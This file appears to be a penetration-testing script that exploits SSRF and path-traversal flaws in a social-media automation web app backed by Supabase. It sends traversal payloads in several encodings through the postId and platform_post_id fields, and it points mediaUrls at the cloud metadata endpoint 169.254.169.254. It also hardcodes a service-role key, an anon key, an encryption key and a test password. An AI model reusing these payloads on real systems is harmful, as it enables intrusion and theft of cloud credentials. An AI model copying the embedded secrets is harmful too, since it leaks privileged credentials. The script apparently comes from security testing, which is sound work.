#!/usr/bin/env python3
"""
SSRF Vulnerability Testing Script - Parts A through F
Tests SSRF-VULN-02, SSRF-VULN-03, SSRF-VULN-07
"""

import requests
import json
import hashlib
import base64
import secrets
import time
import urllib.parse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ============================================================
# Configuration
# ============================================================
SUPABASE_URL = "https://txomrdymcawauezlprvn.supabase.co"
SERVICE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR4b21yZHltY2F3YXVlemxwcnZuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2ODExMDQyOCwiZXhwIjoyMDgzNjg2NDI4fQ.bO5zmywqDdNhN41s4lwHHTAJToCgDdXEBbLuNn08xxM"
ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR4b21yZHltY2F3YXVlemxwcnZuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMTA0MjgsImV4cCI6MjA4MzY4NjQyOH0.dwBcXZ_TZG97GCCvPPtfKETbxnm4jNFSF1K1FwFut0E"
APP_URL = "http://host.docker.internal:3000"
ENCRYPTION_KEY_HEX = "4b229bdfad4dd85e425716090a46674b103ead56275eb3c3b5ddaca558c231c0"
PROJECT_REF = "txomrdymcawauezlprvn"

# Pre-existing test user and workspace from setup
TEST_EMAIL = "ssrf_test_3d1fa59c@pentest.local"
TEST_PASSWORD = "PentestPassword123!@#"
WORKSPACE_ID = "5ecf3626-b4c0-41af-8e56-fdcdba3b6e48"
TIMEOUT = 20

# ============================================================
# Helpers
# ============================================================
def to_base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def encrypt_secret(plaintext: str) -> str:
    """Replicates the app's encryptSecretIfNeeded() function"""
    key = hashlib.sha256(ENCRYPTION_KEY_HEX.encode('utf-8')).digest()
    iv = secrets.token_bytes(12)
    aesgcm = AESGCM(key)
    ct_with_tag = aesgcm.encrypt(iv, plaintext.encode('utf-8'), None)
    ciphertext = ct_with_tag[:-16]
    auth_tag = ct_with_tag[-16:]
    iv_b64 = to_base64url(iv)
    tag_b64 = to_base64url(auth_tag)
    ct_b64 = to_base64url(ciphertext)
    return f"enc:v1:{iv_b64}.{tag_b64}.{ct_b64}"

def log_response(label, resp):
    print(f"\n{'='*60}")
    print(f"[{label}]")
    print(f"  URL:    {resp.url}")
    print(f"  Status: {resp.status_code}")
    print(f"  Headers (selected):")
    for h in ['content-type', 'x-powered-by', 'server']:
        if h in resp.headers:
            print(f"    {h}: {resp.headers[h]}")
    print(f"  Body (COMPLETE):")
    try:
        body = json.dumps(resp.json(), indent=2)
    except Exception:
        body = resp.text
    print(body)
    print(f"{'='*60}")
    return body

def build_session(access_token, refresh_token, user_data, workspace_id):
    session = requests.Session()
    cookie_name_token = f"sb-{PROJECT_REF}-auth-token"
    cookie_value = urllib.parse.quote(json.dumps({
        "access_token": access_token,
        "token_type": "bearer",
        "expires_in": 3600,
        "expires_at": int(time.time()) + 3600,
        "refresh_token": refresh_token,
        "user": user_data
    }))
    session.cookies.set(cookie_name_token, cookie_value, domain="host.docker.internal")
    session.cookies.set("active_workspace_id", workspace_id, domain="host.docker.internal")
    return session

# ============================================================
# PART A: Get fresh access token
# ============================================================
print("\n" + "#"*60)
print("PART A: Get fresh access token")
print("#"*60)

signin_resp = requests.post(
    f"{SUPABASE_URL}/auth/v1/token?grant_type=password",
    headers={"apikey": ANON_KEY, "Content-Type": "application/json"},
    json={"email": TEST_EMAIL, "password": TEST_PASSWORD},
    timeout=TIMEOUT
)
print(f"Signin status: {signin_resp.status_code}")
signin_data = signin_resp.json()
access_token = signin_data.get("access_token")
refresh_token = signin_data.get("refresh_token")
user_data = signin_data.get("user", {})
user_id = user_data.get("id") if user_data else None

if not access_token:
    print(f"ERROR: Could not get access token: {signin_data}")
    exit(1)

print(f"  access_token (first 60 chars): {access_token[:60]}...")
print(f"  refresh_token: {refresh_token[:20] if refresh_token else 'NONE'}...")
print(f"  user_id: {user_id}")

# ============================================================
# PART B: Create fake social account with encrypted token
# ============================================================
print("\n" + "#"*60)
print("PART B: Create fake social account with encrypted token")
print("#"*60)

fake_token_plaintext = "fake_access_token_for_ssrf_test"
encrypted_token = encrypt_secret(fake_token_plaintext)
print(f"  Encrypted token: {encrypted_token}")

social_account_payload = {
    "workspace_id": WORKSPACE_ID,
    "platform": "instagram",
    "account_name": "test_ssrf_account",
    "account_id": "123456789",
    "access_token": encrypted_token,
    "metadata": None
}

insert_resp = requests.post(
    f"{SUPABASE_URL}/rest/v1/social_accounts",
    headers={
        "apikey": SERVICE_KEY,
        "Authorization": f"Bearer {SERVICE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    },
    json=social_account_payload,
    timeout=TIMEOUT
)

print(f"  Insert social account status: {insert_resp.status_code}")
print(f"  Response: {insert_resp.text[:500]}")

fake_account_id = None
if insert_resp.status_code in (200, 201):
    insert_data = insert_resp.json()
    if isinstance(insert_data, list) and len(insert_data) > 0:
        fake_account_id = insert_data[0].get("id")
    elif isinstance(insert_data, dict):
        fake_account_id = insert_data.get("id")
    print(f"  fake_account_id: {fake_account_id}")

if not fake_account_id:
    # Try to look up existing
    print("  Insert failed or no ID returned, trying to find existing account...")
    lookup = requests.get(
        f"{SUPABASE_URL}/rest/v1/social_accounts?workspace_id=eq.{WORKSPACE_ID}&platform=eq.instagram&account_id=eq.123456789&select=id,account_name",
        headers={
            "apikey": SERVICE_KEY,
            "Authorization": f"Bearer {SERVICE_KEY}",
        },
        timeout=TIMEOUT
    )
    print(f"  Lookup status: {lookup.status_code}, body: {lookup.text[:300]}")
    lookup_data = lookup.json()
    if isinstance(lookup_data, list) and len(lookup_data) > 0:
        fake_account_id = lookup_data[0].get("id")
        print(f"  Found existing social account id: {fake_account_id}")

if not fake_account_id:
    print("ERROR: Could not create or find fake social account. Exiting.")
    exit(1)

# ============================================================
# Build authenticated session
# ============================================================
session = build_session(access_token, refresh_token, user_data, WORKSPACE_ID)

# ============================================================
# PART C: Test SSRF-VULN-03 - path traversal via postId
# ============================================================
print("\n" + "#"*60)
print("PART C: Test SSRF-VULN-03 (GET /api/posts-media/comments with path traversal)")
print("#"*60)

# Primary traversal attempt
c_url = f"{APP_URL}/api/posts-media/comments?postId=../../../me/accounts&platform=instagram"
print(f"\n  [C-1] Testing: {c_url}")
try:
    c1_resp = session.get(c_url, timeout=TIMEOUT)
    log_response("C-1: postId=../../../me/accounts", c1_resp)
except Exception as e:
    print(f"  ERROR: {e}")

# With explicit accountId
c_url2 = f"{APP_URL}/api/posts-media/comments?postId=../../../me/accounts&platform=instagram&accountId={fake_account_id}"
print(f"\n  [C-2] Testing with accountId: {c_url2}")
try:
    c2_resp = session.get(c_url2, timeout=TIMEOUT)
    log_response("C-2: postId=../../../me/accounts with accountId", c2_resp)
except Exception as e:
    print(f"  ERROR: {e}")

# ============================================================
# PART D: Test SSRF-VULN-02 (POST /api/automations)
# ============================================================
print("\n" + "#"*60)
print("PART D: Test SSRF-VULN-02 (POST /api/automations)")
print("#"*60)

automation_payload = {
    "social_account_id": fake_account_id,
    "name": "SSRF Test Automation",
    "platform_post_id": "../../../me/accounts",
    "dm_config": {
        "opening_message": "test",
        "button_text": "test",
        "link_url": "http://test.com",
        "link_message": "test"
    },
    "trigger_config": {},
    "comment_reply_config": {"enabled": False, "messages": []}
}

print(f"  Payload: {json.dumps(automation_payload, indent=2)}")
try:
    d_resp = session.post(
        f"{APP_URL}/api/automations",
        json=automation_payload,
        timeout=TIMEOUT
    )
    log_response("D: POST /api/automations with traversal platform_post_id", d_resp)
except Exception as e:
    print(f"  ERROR: {e}")

# ============================================================
# PART E: Test SSRF-VULN-07 (mediaUrls with internal IP)
# ============================================================
print("\n" + "#"*60)
print("PART E: Test SSRF-VULN-07 (POST /api/posts with SSRF mediaUrls)")
print("#"*60)

posts_payload = {
    "workspaceId": WORKSPACE_ID,
    "socialAccountIds": [fake_account_id],
    "content": "Test post",
    "mediaUrls": ["http://169.254.169.254/latest/meta-data/"],
    "platforms": ["instagram"],
    "scheduledFor": None,
    "status": "draft"
}

print(f"  Payload: {json.dumps(posts_payload, indent=2)}")
try:
    e_resp = session.post(
        f"{APP_URL}/api/posts",
        json=posts_payload,
        timeout=TIMEOUT
    )
    log_response("E: POST /api/posts with IMDS mediaUrl", e_resp)
except Exception as e:
    print(f"  ERROR: {e}")

# ============================================================
# PART F: Additional traversal variants for SSRF-VULN-03
# ============================================================
print("\n" + "#"*60)
print("PART F: Additional SSRF-VULN-03 traversal variants")
print("#"*60)

variants = [
    ("F-1: postId=../../../me (simpler)", f"{APP_URL}/api/posts-media/comments?postId=../../../me&platform=instagram"),
    ("F-2: postId=123456789_PAYLOAD/../../../me/accounts", f"{APP_URL}/api/posts-media/comments?postId=123456789_PAYLOAD/../../../me/accounts&platform=instagram"),
    ("F-3: postId=../../../me/accounts with accountId", f"{APP_URL}/api/posts-media/comments?postId=../../../me/accounts&platform=instagram&accountId={fake_account_id}"),
    ("F-4: URL-encoded traversal", f"{APP_URL}/api/posts-media/comments?postId=..%2F..%2F..%2Fme%2Faccounts&platform=instagram"),
    ("F-5: Double-encoded traversal", f"{APP_URL}/api/posts-media/comments?postId=..%252F..%252F..%252Fme%252Faccounts&platform=instagram"),
]

for label, url in variants:
    print(f"\n  Testing: {label}")
    print(f"  URL: {url}")
    try:
        f_resp = session.get(url, timeout=TIMEOUT)
        log_response(label, f_resp)
    except Exception as e:
        print(f"  ERROR: {e}")

# ============================================================
# SUMMARY
# ============================================================
print("\n" + "#"*60)
print("SUMMARY")
print("#"*60)
print(f"  user_id:         {user_id}")
print(f"  workspace_id:    {WORKSPACE_ID}")
print(f"  fake_account_id: {fake_account_id}")
print(f"  encrypted_token: {encrypted_token}")
print("#"*60)
print("Done.")
